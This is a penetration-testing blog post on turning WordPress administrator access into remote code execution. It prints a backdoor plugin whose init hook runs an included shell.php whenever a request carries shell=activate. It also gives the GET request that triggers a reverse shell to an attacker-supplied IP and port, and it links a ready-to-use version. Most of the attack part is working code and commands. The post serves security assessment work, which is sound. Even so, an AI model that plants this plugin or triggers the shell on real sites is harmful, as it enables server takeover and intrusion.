+++
title = "Modern WordPress RCE as Administrator"
description = "Explains how to gain Remote Code Execution (RCE) on modern WordPress instances using administrator privileges by creating and installing a custom plugin that triggers a reverse shell. Also offers a ready-to-use plug-and-play plugin if you don't want to create one from scratch."
tldr = "Got WordPress admin? Use [this](https://github.com/davidxbors/wordpress-rce-plugin) simple plugin with a reverse shell triggerable via GET parameters (/?shell=activate&ip=<IP>&port=<PORT>) to get RCE, as old methods might fail."
date = 2025-04-27
draft = false
+++

## Got Administrator... now what?

Let's say you are in the middle of an assessment and just got credentials as an administrator user on a WordPress instance.
Or got administrative access to the instance via a vulnerability.
What's the next step?

Of course, you now have complete control of the instance and can change anything regarding the website.
While having huge impact, this doesn't allow pivoting.
Also, in the case of the WordPress instance being an old unused website (which it might be if it has weak creds or vulns) the impact might not be that big for the customer.
The good news? Having admin access to a WordPress instance is your golden ticket to getting a shell on the hosting server.

## How to pop a shell?

![i can haz shellz?](/posts/imgs/9s3nbd.jpg)

The classic ways of getting a shell, documented on [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/WordPress.html?highlight=WordPress#panel-rce) as well, involve either:

1. Changing a theme by adding custom webshell code to an arbitrary page;
1. Uploading a webshell as a plugin. The install will fail, but the webshell will be available in the media section.

However, with modern versions of WordPress the two well known staple methods don't work as expected anymore.
Installing a plugin now requires to upload a zip, and in case of install failure WordPress will simply save the zip archive in the media section.
Themes allow you to add custom code to them, but (at least in my case) it is not possible to execute a webshell via this method anymore.

**The solution?**

We can still get remote code exection if we have the rights to install a plugin.
However, we need to actually install a valid plugin.

## The contents of a valid WordPress plugin

The structure of a WordPress plugin zip archive is trivial.
It simply stores directly all the files required by the plugin.
For example, it can be as simple as:

```console
my_plugin.zip
|--- plugin.php
```

In the same time, it can also have more complex structures, use your imagination.

However, there is a very important thing to mention here!
The main file of the plugin, should have the following structure.

```php
<?php
/*
Plugin Name: Demo Shell Plugin
Description: A plugin that establishes a reverse shell.
Version: 1.0
Author: David Bors 
*/
// the actual code of this file goes here
```

If no file has such a comment, WordPress will fail to install the plugin.

## Enough talking, let's write the shell

The code I use, can also be found on my github, [here](https://github.com/davidxbors/wordpress-rce-plugin).

But, let's take a look at it.

```php
<?php
/*
Plugin Name: Demo Shell Plugin
Description: A plugin that establishes a reverse shell.
Version: 1.0
Author: David Bors 
*/
// Trigger shell.php when a specific query parameter is present
function trigger_shell() {
    if (isset($_GET['shell']) && $_GET['shell'] === 'activate') {
        include_once plugin_dir_path(__FILE__) . 'shell.php';
        exit; // Prevent WordPress from rendering further
    }
}
add_action('init', 'trigger_shell');
```

This is the entrypoint of the plugin.
It defines a simple `trigger_shell` function, which, if a `GET` requests has the following `shell` parameter with the `activate` value, will execute the code from an additional `shell.php` file.

`add_action` defines an action for the plugin.
The `init` action is an early phase when WordPress is setting up but before output is sent to the browser.
This ensures our function will be executed at every rendering of any page on the WordPress instance.

So, to recap, each time a page is rendered by WordPress, this plugin checks if the `shell=activate` parameter / value pair is present.
If it is, it runs the malicious code present in `shell.php`.

`shell.php` has a generic reverse shell, taken from [revshells.com](https://www.revshells.com/).
I changed that shell so the IP and port used for the reverse shell is also taken from `GET` parameters, so one can use this plugin in a plug and play manner.

In the end, a request that will trigger the shell and start a reverse shell to one's machine should look like this:

```console
GET /?shell=activate&ip=<IP>&port=<PORT>
```

Thanks for reading all this, and I hope this ready to use, plug and play plugin will help you!
